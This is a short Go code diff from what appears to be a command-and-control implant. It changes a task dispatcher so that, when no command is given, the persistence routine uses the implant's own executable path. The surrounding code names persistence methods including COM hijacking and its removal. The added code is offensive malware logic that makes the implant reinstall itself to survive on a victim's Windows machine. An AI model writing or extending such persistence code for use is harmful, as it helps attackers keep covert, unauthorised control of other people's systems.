@@ -571,6 +571,14 @@ func dispatchTask(t transport, task taskWire) {
 					pa.Method = f[0]
 				}
 			}
+			// Auto-fill cmd with own exe path when not specified (same as PERSIST_TASK)
+			if pa.Cmd == "" && pa.Method != "rm" && pa.Method != "remove" && pa.Method != "comhijack-rm" && pa.Method != "com-rm" {
+				if exe, err := os.Executable(); err == nil {
+					pa.Cmd = exe
+				} else {
+					pa.Cmd = os.Args[0]
+				}
+			}
 		}
 		out, err := persistMethod(pa.Method, pa.Cmd, pa.Name)
 		errStr := ""
